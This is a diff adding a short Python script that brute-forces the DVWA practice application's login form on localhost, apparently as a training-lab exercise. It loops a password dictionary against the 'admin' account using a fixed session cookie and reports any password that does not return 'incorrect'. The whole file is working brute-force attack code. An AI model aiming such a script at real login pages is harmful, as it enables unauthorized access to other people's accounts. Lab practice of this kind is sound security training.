@@ -1,0 +1,21 @@
+import requests
+
+dict_file='/home/dojo/Desktop/passwords.txt'
+u_n_l=['admin']
+headers = {'Cookie':'security=low; PHPSESSID=dqohk96fmfcilo4b2gk17h9oct','Referer':'http://localhost/DVWA/index.php'}
+
+def get_http(u_n,p_w):
+    url = "http://localhost/dvwa/vulnerabilities/brute/?username="+u_n+"&password="+p_w+"&Login=Login#"
+    req = requests.get(url,headers=headers)
+    return(url,req.status_code,req.text)
+
+print('Starting brutforce')
+for list in u_n_l:
+    u_n=list
+    f = open(dict_file,'r')    
+    for line in f:
+        p_w = line.strip()
+        url,status_code,result=get_http(u_n,p_w)
+        if result.find('incorrect')==-1:
+            print('Login: '+u_n+', password: '+p_w)
+    f.close()
